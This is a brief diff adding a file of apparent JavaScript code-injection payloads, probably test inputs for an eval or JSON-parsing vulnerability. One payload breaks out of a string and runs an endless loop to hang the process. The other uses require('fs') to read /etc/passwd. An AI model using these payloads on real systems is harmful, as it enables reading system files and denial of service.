@@ -1,0 +1,7 @@
+'}); while(1); //
+
+
+{'symbol' : 'abc' + (function() { 
+  var fs = require('fs');
+  return fs.readFileSync('/etc/passwd'); 
+})() }
